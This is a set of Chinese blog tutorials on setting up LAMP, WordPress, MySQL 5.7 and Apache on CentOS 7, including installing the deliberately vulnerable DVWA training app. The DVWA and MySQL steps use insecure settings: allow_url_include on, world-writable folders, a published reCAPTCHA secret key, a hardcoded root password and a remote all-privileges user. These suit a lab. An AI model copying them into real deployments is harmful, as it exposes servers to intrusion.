title="3、LAMP工作过程"></a>3、LAMP工作过程</h3><p>处理一次动态页面请求，服务器主要经历：<strong>Apache处理请求——通过CGI接口访问PHP的的应用程序——PHP应用程序调用PHP解释器执行PHP代码——PHP程序访问调用数据库——最后给客户做反馈。</strong></p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20181119083215117.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NqMzQ5NzgxNDc4,size_16,color_FFFFFF,t_70" alt="img"></p><p> apache主要实现如下功能：</p><pre><code>第一：处理http的请求、构建响应报文等自身服务；第二：配置让Apache支持PHP程序的响应（通过PHP模块或FPM）；第三：配置Apache具体处理php程序的方法，如通过反向代理将php程序交给fcgi处理。</code></pre><p>mysql主要实现如下功能：</p><pre><code>第一：提供PHP程序对数据的存储；第二：提供PHP程序对数据的读取(通常情况下从性能的角度考虑，尽量实现数据库的读写分离)。</code></pre><p>php主要实现如下功能：</p><pre><code>第一：提供apache的访问接口，即CGI或Fast CGI(FPM);第二：提供PHP程序的解释器；第三：提供mairadb数据库的连接函数的基本环境。</code></pre><h2 id="二、LAMP动态网站部署"><a href="#二、LAMP动态网站部署" class="headerlink" title="二、LAMP动态网站部署"></a>二、LAMP动态网站部署</h2><h4 id="1、配置国内YUM源"><a href="#1、配置国内YUM源" class="headerlink" title="1、配置国内YUM源"></a>1、配置国内YUM源</h4><p>首先备份/etc/yum.repos.d/CentOS-Base.repo</p><pre><code>mkdir  /etc/yum.repos.d/bak mv     /etc/yum.repos.d/CentOS-*   /etc/yum.repos.d/bak</code></pre><p>下载新的YUM源配置文件</p><pre><code>wget -P /etc/yum.repos.d/ http://mirrors.163.com/.help/CentOS7-Base-163.repo</code></pre><h4 id="2、Apache的安装与运行"><a href="#2、Apache的安装与运行" class="headerlink" title="2、Apache的安装与运行"></a>2、Apache的安装与运行</h4><ul><li><p>使用yum安装apache</p><pre><code>yum -y install httpd</code></pre></li><li><p>检查是否安装成功</p><pre><code>[root@server1 ~]# rpm -qa |grep httpd</code></pre></li><li><p>启动apache服务并设置开机自启</p><pre><code>systemctl     start     httpdsystemctl    enable    httpd</code></pre></li><li><p>配置防火墙</p><pre><code>firewall-cmd  --add-port=80/tcp --permanent firewall-cmd  --reload</code></pre></li><li><p>重启apache，测试页面是否正常。</p><h3 id="3、安装PHP"><a href="#3、安装PHP" class="headerlink" title="3、安装PHP"></a>3、安装PHP</h3><p>1）安装PHP扩展源</p><pre><code>rpm -Uvh https://dl.fedoraproject.org/pub/epel/epel-release-latest-7.noarch.rpmrpm -Uvh https://mirror.webtatic.com/yum/el7/webtatic-release.rpm</code></pre><p>2) 安装PHP7.2</p><pre><code>[root@server1 ~]# yum -y install php72w php72w-cli php72w-common php72w-devel php72w-embedded php72w-gd php72w-mbstring php72w-pdo php72w-xml php72w-fpm php72w-mysqlnd  php72w-opcache</code></pre><p>3）创建php测试主页并验证</p><pre><code>[root@server1 ~]# echo '&lt;?php phpinfo() ?&gt;' &gt; /var/www/html/index.php[root@server1 ~]# systemctl restart httpd</code></pre><p>4）测试浏览器能正常访问到php测试页面</p></li></ul><h3 id="4、安装mysql5-7"><a href="#4、安装mysql5-7" class="headerlink" title="4、安装mysql5.7"></a>4、安装mysql5.7</h3><p>​    1）安装mysql5.7 YUM源</p><pre><code>[root@192 ~]# rpm -ivh http://dev.mysql.com/get/mysql57-community-release-el7-11.noarch.rpm</code></pre><p>​    2）安装mysql-server</p><pre><code>[root@192 ~]# yum -y install mysql-server</code></pre><p>​    3）启动mysql</p><pre><code>[root@192 ~]# systemctl start mysqld        #启动MySQL[root@192 ~]# systemctl enable mysqld        #设置MySQL服务开机自启</code></pre><p>​    4）修改数据库临时密码</p><pre><code>password=$(grep "temporary password" /var/log/mysqld.log  | awk '{print $NF}') mysqladmin -uroot -p$password password CentOS@7</code></pre><p>5）创建测试页面，检测PHP与mysql数据库的连通性</p><pre><code>vim /var/www/html/mysql.php&lt;?php$link=mysqli_connect("localhost","root","CentOS@7","mysql");if(!$link){        echo "Game Over." .PHP_EOL;        echo "Debugging errno:" .mysqli_connect_errno() .PHP_EOL;        echo "Debugging error:" .mysqli_connect_error() .PHP_EOL;        exit;}else{        echo "Very Good" .PHP_EOL;        echo "Host information:" .mysqli_get_host_info($link) .PHP_EOL;}mysqli_close($link);    ?&gt;</code></pre><h2 id="三、安装WordPress博客系统"><a href="#三、安装WordPress博客系统" class="headerlink" title="三、安装WordPress博客系统"></a>三、安装WordPress博客系统</h2><p>1、下载WordPress资源包</p><pre><code>[root@192 ~]# wget https://cn.wordpress.org/latest-zh_CN.zip</code></pre><p>2、将WordPress解压到apache默认主页目录下</p><pre><code>[root@192 ~]# unzip -d /var/www/html/ latest-zh_CN.zip</code></pre><p>3、通过浏览器访问安装</p><pre><code>http://192.168.2.15/wordpress/</code></pre><p>4、安装WordPress</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="C:%5CUsers%5CPing%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210424182407367.png" alt="image-20210424182407367"></p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="C:%5CUsers%5CPing%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210424182507697.png" alt="image-20210424182507697"></p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="C:%5CUsers%5CPing%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210424183537789.png" alt="image-20210424183537789"></p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="C:%5CUsers%5CPing%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210424183610906.png" alt="image-20210424183610906"></p><h2 id="四、安装DVWA测试环境"><a href="#四、安装DVWA测试环境" class="headerlink" title="四、安装DVWA测试环境"></a>四、安装DVWA测试环境</h2><p>1、将 DVWA 文件夹放入/var/www/html/（ LAMP 默认的网站目录）内。</p><p>2、修改配置文件</p><p>在配置文件修改数据库连接密码，填入之前修改后的mysql数据库密码。</p><p>vim /var/www/html/DVWA/config/config.inc.php</p><p>将 <strong>$_DVWA[ ‘db_password’ ] = ‘p@ssw0rd’</strong>; 这行的密码修改为我们的 MySQL 数据库密码。</p><pre><code>$_DVWA[ 'db_server' ]   = '127.0.0.1';$_DVWA[ 'db_database' ] = 'dvwa';$_DVWA[ 'db_user' ]     = 'root';$_DVWA[ 'db_password' ] = 'Centos@7';</code></pre><p>3、使用浏览器访问安装。</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="C:%5CUsers%5CPing%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210424184232444.png" alt="image-20210424184232444"></p><p>4、解决红色报错信息</p><p><strong>PHP function allow_url_include:</strong> <strong>Disabled</strong></p><p><strong>解决方法：</strong></p><pre><code>使用 vim /etc/php.ini 命令打开配置文件输入 /allow_url_include 回车搜索将 allow_url_include = Off 改为 allow_url_include = Onsystemctl restart httpd  //重启 apache</code></pre><p><strong>reCAPTCHA key:</strong> <strong>Missing</strong></p><p><strong>解决方法：</strong></p><pre><code>此报错为缺少谷歌验证码，可以前往 [https://www.google.com/recaptcha/admin#list](https://link.jianshu.com/?t=https%3A%2F%2Fwww.google.com%2Frecaptcha%2Fadmin%23list) 根据页面提示申请一个 key，我们使用已经生成好的验证码Site key: 6LdJJlUUAAAAAH1Q6cTpZRQ2Ah8VpyzhnffD0mBbSecret key: 6LdJJlUUAAAAAM2a3HrgzLczqdYp4g05EqDs-W4K编辑 dvwa/config/config.inc.php这个配置文件vim /var/www/html/DVWA/config/config.inc.php在以下两行填入验证码$_DVWA[ 'recaptcha_public_key' ] = ''; $_DVWA[ 'recaptcha_private_key' ] = '';修改后如下:$_DVWA[ 'recaptcha_public_key' ] = '6LdJJlUUAAAAAH1Q6cTpZRQ2Ah8VpyzhnffD0mBb'; $_DVWA[ 'recaptcha_private_key' ] = '6LdJJlUUAAAAAM2a3HrgzLczqdYp4g05EqDs-W4K';</code></pre><p><strong>[User: nginx] Writable folder /**</strong>var/www/<strong><strong>html</strong></strong>/<strong>**DVWA/hackable/uploads/:</strong> <strong>No</strong></p><p><strong>[User: nginx] Writable file</strong> <strong>/**</strong>var/www/<strong><strong>html</strong></strong>/<strong>**DVWA/external/phpids/0.6/lib/IDS/tmp/phpids_log.txt:</strong> <strong>No</strong></p><p><strong>解决方法：</strong></p><pre><code>chmod 763  /var/www/html/DVWA/hackable/uploads/ -Rchmod 666 /var/www/html/DVWA/external/phpids/0.6/lib/IDS/tmp/phpids_log.txt -R</code></pre><p>在浏览器重新刷新页面，没有报错后单击底部 Create / Reset Database 按钮，即可跳转至 DVWA 的登陆页面。DVWA 的默认登陆帐号是 admin 密码是 password</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 网络运维篇 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 运维 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MySQL服务器配置</title>
      <link href="/posts/ba9b8955.html"/>
      <url>/posts/ba9b8955.html</url>
      
        <content type="html"><![CDATA[<h1 id="MySQL服务器配置"><a href="#MySQL服务器配置" class="headerlink" title="MySQL服务器配置"></a>MySQL服务器配置</h1><h2 id="一、MySQL简介"><a href="#一、MySQL简介" class="headerlink" title="一、MySQL简介"></a>一、MySQL简介</h2><p>​    MySQL是一个关系型数据库管理系统，由瑞典MySQL AB公司开发，目前属于Oracle公司旗下产品。由于MySQL性能高，成本低、可靠性好，已经成为目前非常流行的开源数据库，因此MySQL被广泛地应用在中小型网站中。随着MySQL的不断发展，它逐渐被用于更多大型集群网站和应用中。比如维基百科、Google和Facebook等网站。非常流行的开源软件组合LAMP中的“M”指的就是MySQL。</p><p>MySQL的特性：</p><ol><li>使用C和C++编写，并使用了多种编译器进行测试，保证源代码的可移植性。</li><li>支持AIX、BSDi、FreeBSD、HP-UX、Linux、Mac OS、Novell Netware、NetBSD、OpenBSD、OS/2 Wrap、Solaris、SunOS、Windows等多种操作系统。</li><li>为多种编程语言提供了API。这些编程语言包括C、C++、C#、Delphi、Eiffel、Java、Perl、PHP、Python、Ruby和Tcl等。</li><li>支持多线程，充分利用CPU资源，支持多用户。</li><li>优化的SQL查询算法，有效地提高查询速度。</li><li>既能够作为一个单独的应用程序应用在客户端服务器网络环境中，也能够作为一个库而嵌入到其他的软件中。</li><li>提供多语言支持，常见的编码如中文的GB 2312、BIG5，日文的Shift_JIS等都可以用作数据表名和数据列名。</li><li>提供TCP/IP、ODBC和JDBC等多种数据库连接途径。</li><li>提供用于管理、检查、优化数据库操作的管理工具。</li><li>可以处理拥有上千万条记录的大型数据库。</li><li>支持多种存储引擎。</li></ol><pre><code>目前，用MySQL数据库构建网站与信息管理系统的应用环境主要有两种架构方式：LAMP和WAMP。LAMP（Linux+Apache+MySQL+PHP/Perl/Python）即使用Linux作为操作系统。Apache作为web服务器，MySQL作为数据库管理系统，PHP/Perl/Python作为服务器端脚步解释器。LAMP架构的所有组成产品均是开源软件，具有通用、跨平台、高性能、低价格的特点。WAMP（Windows+ Apache+MySQL+PHP/Perl/Python）即使用Windows作为操作系统，Apache作为web服务器，MySQL作为数据库管理系统，PHP/Perl/Python作为服务器端脚步解释器。</code></pre><h2 id="二、MySQL的安装与运行"><a href="#二、MySQL的安装与运行" class="headerlink" title="二、MySQL的安装与运行"></a>二、MySQL的安装与运行</h2><h3 id="1、添加MySQL5-7-YUM源"><a href="#1、添加MySQL5-7-YUM源" class="headerlink" title="1、添加MySQL5.7 YUM源"></a>1、添加MySQL5.7 YUM源</h3><p>CentOS7默认配置下不再提供MySQL软件包，取而代之的是MySQL的分支MariaDB，所以想要安装MySQL，需要添加一个YUM源，MySQL官方提供了一个RPM软件包来创建YUM源，可以执行以下命令进行安装。</p><pre><code>[root@192 ~]# rpm -ivh http://dev.mysql.com/get/mysql57-community-release-el7-11.noarch.rpm</code></pre><h3 id="2、启用仓库"><a href="#2、启用仓库" class="headerlink" title="2、启用仓库"></a>2、启用仓库</h3><p>在MySQL5.7YUM源安装完成后，会在/etc/yum.repo.d/目录下生成两个文件，mysql-community.repo  文件和mysql-community-source.repo文件.<u></u></p><pre><code>[root@192 ~]# ls /etc/yum.repos.d/bak  CentOS7-Base-163.repo  mysql-community.repo  mysql-community-source.repo</code></pre><p>在YUM源配置完成后，可以使用以下命令进行验证：</p><pre><code>[root@192 ~]# yum clean all            #清除yum缓存[root@192 ~]# yum repolist            #检察yum源是否正常</code></pre><h3 id="3、安装mysql-server"><a href="#3、安装mysql-server" class="headerlink" title="3、安装mysql-server"></a>3、安装mysql-server</h3><pre><code>[root@192 ~]# yum -y install mysql-server</code></pre><p>在执行该命令后，会安装mysql-server（服务器端软件）和mysql-client（客户端软件）。</p><h3 id="4、启动MySQL服务"><a href="#4、启动MySQL服务" class="headerlink" title="4、启动MySQL服务"></a>4、启动MySQL服务</h3><pre><code>[root@192 ~]# systemctl start mysqld        #启动MySQL[root@192 ~]# systemctl enable mysqld        #设置MySQL服务开机自启[root@192 ~]# systemctl status mysqld        #查看MySQL服务的状态● mysqld.service - MySQL Server   Loaded: loaded (/usr/lib/systemd/system/mysqld.service; enabled; vendor preset: disabled)   Active: active (running) since 六 2021-04-24 14:08:11 CST; 17s ago     Docs: man:mysqld(8)           http://dev.mysql.com/doc/refman/en/using-systemd.html Main PID: 13733 (mysqld)   CGroup: /system.slice/mysqld.service           └─13733 /usr/sbin/mysqld --daemonize --pid-file=/var/run/mysqld/mysqld.p...4月 24 14:08:04 192.168.2.15 systemd[1]: Starting MySQL Server...4月 24 14:08:11 192.168.2.15 systemd[1]: Started MySQL Server.</code></pre><h3 id="5、登录MySQL"><a href="#5、登录MySQL" class="headerlink" title="5、登录MySQL"></a>5、登录MySQL</h3><p>由于MySQL5.7安装了密码安全检查插件validate_password，默认密码检查策略要求密码必须包含大写字母、小写字母、数字和特殊符号，并且长度不能少于8位。在安装完并启动成功后，会生成一个临时密码（用于登录），登录后要求必须重设密码。</p><p>临时密码在MySQL日志中查找，命令如下：</p><pre><code>[root@192 ~]# grep "temporary password" /var/log/mysqld.log 2021-04-24T06:08:09.706535Z 1 [Note] A temporary password is generated for root@localhost: p-jWunqy#2q0</code></pre><p>可以看到临时密码为“p-jWunqy#2q0”，然后使用改密码登录MySQL并修改密码，命令如下：</p><pre><code>[root@192 ~]# mysql -uroot -pEnter password:                 #输入临时密码“p-jWunqy#2q0”,按回车确认。Welcome to the MySQL monitor.  Commands end with ; or \g.Your MySQL connection id is 2Server version: 5.7.34Copyright (c) 2000, 2021, Oracle and/or its affiliates.Oracle is a registered trademark of Oracle Corporation and/or itsaffiliates. Other names may be trademarks of their respectiveowners.Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.mysql&gt;      #MySQL命令提示符#指定任何操作前都会提示修改密码mysql&gt; show databases;ERROR 1820 (HY000): You must reset your password using ALTER USER statement before executing this statement.#修改密码mysql&gt;  ALTER USER 'root'@'localhost' IDENTIFIED BY 'CentOS@7';Query OK, 0 rows affected (0.00 sec)#更新权限列表mysql&gt; flush privileges;Query OK, 0 rows affected (0.01 sec)#退出MySQL登录mysql&gt; \qBye</code></pre><pre><code>补充：如果不想使用MySQL5.7的密码安全插件，可以通过修改配置文件管理。#编辑MySQL配置文件vim /etc/my.cnf#在配置文件添加以下配置    validate_password = off</code></pre><h2 id="三、MySQL的配置与优化"><a href="#三、MySQL的配置与优化" class="headerlink" title="三、MySQL的配置与优化"></a>三、MySQL的配置与优化</h2><p>在MySQL安装完成后，就可以使用MySQL软件包提供的交互式脚本文件mysql_secure_installation中进行初始化配置并加固服务器，在命令行直接输入“ mysql_secure_installation”即可执行脚本文件，命令如下：</p><pre><code>[root@192 ~]# mysql_secure_installation Securing the MySQL server deployment.Enter password for user root:                         #输入root密码（如果未设置则输入临时密码）The 'validate_password' plugin is installed on the server.The subsequent steps will run with the existing configurationof the plugin.Using existing password for root.Estimated strength of the password: 100 Change the password for root ? ((Press y|Y for Yes, any other key for No) : y    #是否修改root密密麻麻New password:                 #输入新密码Re-enter new password:        #确认密码 Estimated strength of the password: 100      #测试密码强度，确认是否使用Do you wish to continue with the password provided?(Press y|Y for Yes, any other key for No) : yBy default, a MySQL installation has an anonymous user,allowing anyone to log into MySQL without having to havea user account created for them. This is intended only fortesting, and to make the installation go a bit smoother.You should remove them before moving into a productionenvironment.#是否移除匿名用户Remove anonymous users? (Press y|Y for Yes, any other key for No) : ySuccess.Normally, root should only be allowed to connect from'localhost'. This ensures that someone cannot guess atthe root password from the network.#是否禁止root用户远程登录Disallow root login remotely? (Press y|Y for Yes, any other key for No) : ySuccess.By default, MySQL comes with a database named 'test' thatanyone can access. This is also intended only for testing,and should be removed before moving into a productionenvironment.#是否删除测试数据库Remove test database and access to it? (Press y|Y for Yes, any other key for No) : y - Dropping test database...Success. - Removing privileges on test database...Success.Reloading the privilege tables will ensure that all changesmade so far will take effect immediately.是否立刻刷新权限列表Reload privilege tables now? (Press y|Y for Yes, any other key for No) : ySuccess.All done! </code></pre><p>MySQL完成初始化后，默认只有一个root用户并且只允许本地主机登录数据库，根据生产需求，我们需要创建一个可用于远程登录并进行数据库管理的用户，创建过程如下：</p><pre><code>[root@192 ~]# mysql -uroot -pCentos@7mysql: [Warning] Using a password on the command line interface can be insecure.Welcome to the MySQL monitor.  Commands end with ; or \g.Your MySQL connection id is 5Server version: 5.7.34 MySQL Community Server (GPL)Copyright (c) 2000, 2021, Oracle and/or its affiliates.Oracle is a registered trademark of Oracle Corporation and/or itsaffiliates. Other names may be trademarks of their respectiveowners.Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.mysql&gt; GRANT ALL PRIVILEGES ON *.* TO 'admin'@'%' IDENTIFIED BY 'Centos@11';Query OK, 0 rows affected, 1 warning (0.01 sec)mysql&gt; flush privileges;Query OK, 0 rows affected (0.00 sec)mysql&gt; \qBye</code></pre><p>为了能让远程主机访问服务器上的MySQL数据库，需要修改MySQL监听的IP地址，在配置文件/etc/my.cnf下的[mysqld]模块下添加“bind_address=0.0.0.0”。“0.0.0.0”表示所有远程主机。</p><pre><code>[root@192 ~]# vim /etc/my.cnf[mysqld]bind_address=0.0.0.0</code></pre><p>配置防火墙开放TCP协议的3306端口。</p><pre><code>[root@192 ~]# firewall-cmd --add-port=3306/tcp --permanent success[root@192 ~]# firewall-cmd --reloadsuccess</code></pre><h2 id="四、MySQL客户端"><a href="#四、MySQL客户端" class="headerlink" title="四、MySQL客户端"></a>四、MySQL客户端</h2><p>几款常用的mysql图形管理工具.</p><p><strong>1、 Navicat</strong></p><p>目前开发者用的最多的一款mysql图形用户管理工具，界面简洁、功能也非常强大，与微软的SQLServer管理器很像，简单易学，支持中文，提供免费版本。</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="C:%5CUsers%5CPing%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210424150858905.png" alt="image-20210424150858905"></p><p><strong>2、 SQLyog</strong></p><p>webyog公司的产品，一款易于使用、快速而简洁的mysql数据库图形化管理工具，可以直观的在任何地点高效地管理你的数据库。</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="C:%5CUsers%5CPing%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210424151227052.png" alt="image-20210424151227052"></p><h3 id="3、-PhpMyadmin"><a href="#3、-PhpMyadmin" class="headerlink" title="3、 PhpMyadmin"></a>3、 <strong>PhpMyadmin</strong></h3><p>这款是用PHP编程语言开发的基于web方式的网页版mysql图形化管理工具，支持中文、界面友好、简洁，方便管理，但是对于数据量大的操作容易导致页面请求超时。</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="C:%5CUsers%5CPing%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210424152512272.png" alt="image-20210424152512272"></p><h3 id="4、Workbench"><a href="#4、Workbench" class="headerlink" title="4、Workbench"></a>4、<strong>Workbench</strong></h3><p>Mysql官方的一个图形管理工具，支持数据库的创建、设计、迁移、备份、导出、导入等功能，支持windows、linux、mac主流的操作系统</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="C:%5CUsers%5CPing%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210424153517546.png" alt="image-20210424153517546"></p><h2 id="五、MySQL基本使用"><a href="#五、MySQL基本使用" class="headerlink" title="五、MySQL基本使用"></a>五、MySQL基本使用</h2><h3 id="1、启动-停止服务、开机自启动、查看服务状态"><a href="#1、启动-停止服务、开机自启动、查看服务状态" class="headerlink" title="1、启动/停止服务、开机自启动、查看服务状态"></a>1、启动/停止服务、开机自启动、查看服务状态</h3><pre><code>[root@192 ~]# systemctl restart mysqld[root@192 ~]# systemctl stop mysqld[root@192 ~]# systemctl enable mysqld[root@192 ~]# systemctl status mysqld</code></pre><h3 id="2、连接MySQL服务器"><a href="#2、连接MySQL服务器" class="headerlink" title="2、连接MySQL服务器"></a>2、连接MySQL服务器</h3><pre><code>[root@192 ~]# mysql -h 地址 -P 端口 -u 用户名 -p 密码</code></pre><h3 id="3-据库常用操作"><a href="#3-据库常用操作" class="headerlink" title="3.据库常用操作"></a>3.据库常用操作</h3><h4 id="1-查询所有数据库"><a href="#1-查询所有数据库" class="headerlink" title="1)查询所有数据库"></a>1)查询所有数据库</h4><pre><code>mysql&gt; SHOW DATABASES</code></pre><h4 id="2-查看某数据库的所有表"><a href="#2-查看某数据库的所有表" class="headerlink" title="2)查看某数据库的所有表"></a>2)查看某数据库的所有表</h4><pre><code>mysql&gt;SHOW TABLES；mysql&gt;SHOW TABLES FROM 数据库名；</code></pre><h4 id="3-增加用户"><a href="#3-增加用户" class="headerlink" title="3)增加用户"></a>3)增加用户</h4><pre><code>mysql＞ CREATE USER＂用户名＂ IDENTIFIED BY＂密码”;执行该操作必须拥有 MYSQL数据库的全局 CREATE USER权限，或者拥有 INSERT权限该操作只能创建用户，不能赋予权限用户名，注意加引号:如"user name"＠192.168.100100。密码也需要加引号，纯数字密码也要加引号要求密码必须包含大写字母、小写字母、数字和特殊符号，并且长度不能少于8位 例： CREATE USER "user" IDENTIFIED BY "Redhat##332"</code></pre><h4 id="4-为用户设置密码"><a href="#4-为用户设置密码" class="headerlink" title="4)为用户设置密码"></a>4)为用户设置密码</h4><pre><code>mysq&gt;SET PASSWORD=PASSWORD(密码);为当前用户设置密码mysq&gt;SET PASSWORD FOR 用户名 PASSWORD (密码);为指定用户设置密码</code></pre><h4 id="5-删除用户"><a href="#5-删除用户" class="headerlink" title="5)删除用户"></a>5)删除用户</h4><pre><code>mysql＞ DROP USER 用户名;例: DROP USER user;</code></pre><h4 id="6-分配权限和添加用户"><a href="#6-分配权限和添加用户" class="headerlink" title="6)分配权限和添加用户"></a>6)分配权限和添加用户</h4><pre><code>mysq&gt;GRANT  权限列表 ON 库名.表名  TO  "用户名"@"%" IDENTIFIED BY "PASSWORD" --all privileges表示所有权限*.* 表示所有库的所有表库名.表名表示某库下面的某表％表示所有主机都可登录，也可以指定P地址</code></pre><h4 id="7-重置root用户密码（忘记密码）"><a href="#7-重置root用户密码（忘记密码）" class="headerlink" title="7)重置root用户密码（忘记密码）"></a>7)重置root用户密码（忘记密码）</h4><pre><code>1、停止mysql服务    systemctl stop mysqld2、修改配置文件    vim /etc/my.cnf    ######在[mysqld]下添加######    skip-grant-tables    ############################3、重启mysql    systemctl  restart mysqld4、不需要用户、密码，直接登录mysql,修改root用户密码    mysqlmysql&gt;update mysql.user set authentication_string=password('123456') where  User='root' and Host='localhost';mysql&gt;flush privileges;mysql&gt;\q5、在配置文件中，去掉跳过授权    vim /etc/my.cnf    ######在[mysqld]删除或注释掉下行######    skip-grant-tables    ############################6、重启mysql，使用新密码登录    systemctl restart mysqld    mysql -uroot -p123456</code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 网络运维篇 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 运维 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Apache 服务器配置</title>
      <link href="/posts/15fa9625.html"/>
      <url>/posts/15fa9625.html</url>
      
        <content type="html"><![CDATA[<h1 id="Apache-服务器配置"><a href="#Apache-服务器配置" class="headerlink" title="Apache 服务器配置"></a>Apache 服务器配置</h1><h2 id="一、Apache简介"><a href="#一、Apache简介" class="headerlink" title="一、Apache简介"></a>一、Apache简介</h2><p>​        Apache HTTP server（简称Apache）是Apache软件基金会的一个开放源代码的网页服务器软件，可以运行在绝大多数的UNIX、Linux、Windows平台上。</p><p>​        由于Apache具有跨平台性、安全性和可移植性等特点，因此它被广泛使用，是非常流行的Web服务器软件之一。</p><pre><code>survey.netcraft.net此网站会有每月份的世界上网站使用的WEB服务器的使用率统计。</code></pre><p>[<a href="https://news.netcraft.com/archives/category/web-server-survey/]" target="_blank" rel="noopener">https://news.netcraft.com/archives/category/web-server-survey/]</a>: </p><h2 id="二、Apache的安装与运行"><a href="#二、Apache的安装与运行" class="headerlink" title="二、Apache的安装与运行"></a>二、Apache的安装与运行</h2><h3 id="2-1-源码编译安装与运行"><a href="#2-1-源码编译安装与运行" class="headerlink" title="2.1    源码编译安装与运行"></a>2.1    源码编译安装与运行</h3><h4 id="1、安装依赖包"><a href="#1、安装依赖包" class="headerlink" title="1、安装依赖包"></a>1、安装依赖包</h4><p>​       在开始编译安装之前，需要安装编译时所需要的依赖包，这样才能顺利编译安装。</p><pre><code>yum -y install gcc autoconf automake make zlib pcre pcre-devel openssl openssl-devel expat-devel</code></pre><h4 id="2、下载最新源码包"><a href="#2、下载最新源码包" class="headerlink" title="2、下载最新源码包"></a>2、下载最新源码包</h4><p>​    在解决以来环境之后，就需要通过官网获取最新的源码包。</p><pre><code>wget    https://mirrors.bfsu.edu.cn/apache//httpd/httpd-2.4.46.tar.gzwget    https://mirrors.tuna.tsinghua.edu.cn/apache/apr/apr-1.7.0.tar.gzwget    https://mirrors.tuna.tsinghua.edu.cn/apache/apr/apr-util-1.6.1.tar.gz</code></pre><h4 id="3、编译安装apr库"><a href="#3、编译安装apr库" class="headerlink" title="3、编译安装apr库"></a>3、编译安装apr库</h4><p>由于Apache的运行依赖于apr库（Apache可移植运行库，该库包含了一些通用的开发组件），因此在开始编译Apache之前需要先编译安装apr库。</p><pre><code>tar zxvf apr-1.7.0.tar.gz cd apr-1.7.0/./configure &amp;&amp; make &amp;&amp; make installcd ..tar zxvf apr-util-1.6.1.tar.gz cd apr-util-1.6.1/./configure --with-apr=/usr/local/aprmake &amp;&amp; make install</code></pre><h4 id="4、编译安装Apache"><a href="#4、编译安装Apache" class="headerlink" title="4、编译安装Apache"></a>4、编译安装Apache</h4><pre><code>tar xvf httpd-2.4.46.tar.gz cd httpd-2.4.46/./configure --prefix=/usr/local/apache2 --enable-so --enable-ssl --enable-rewrite --enable-cgi --with-suexec-bin --with-apr=/usr/local/apr --enable-modules=most --enable-mods-shared=most --enable-mpms-shared=all --with-mpm=worker --enable-deflate --enable-expiresmake &amp;&amp;make install</code></pre><h4 id="5、编译安装Apache后的目录结构"><a href="#5、编译安装Apache后的目录结构" class="headerlink" title="5、编译安装Apache后的目录结构"></a>5、编译安装Apache后的目录结构</h4><p>Apache编译安装完成后，安装目录是/usr/local/apache2，该目录下包含以下重要文件和目录。</p><table><thead><tr><th>目录名</th><th>内容</th></tr></thead><tbody><tr><td>bin</td><td>Apache执行文件的目录</td></tr><tr><td>cgi-bin</td><td>默认CGI文件</td></tr><tr><td>conf</td><td>配置文件</td></tr><tr><td>htdocs</td><td>编译安装时默认的web文档根目录</td></tr><tr><td>icons</td><td>Apache使用的一些小图标</td></tr><tr><td>logs</td><td>日志文件存放的位置，有两种日志：访问日志和错误日志</td></tr><tr><td>manual</td><td>Apache文档目录</td></tr><tr><td>modules</td><td>动态加载模块所在位置</td></tr></tbody></table><p>为了方便管理Apache程序，我们把/usr/loacl/apache2/bin目录下的脚本文件链接到/usr/local/bin目录下，以后就可以在终端直接使用这些命令了。</p><pre><code>ln -s /usr/local/apache2/bin/* /usr/bin/</code></pre><h4 id="6、配置Apache服务开机自启"><a href="#6、配置Apache服务开机自启" class="headerlink" 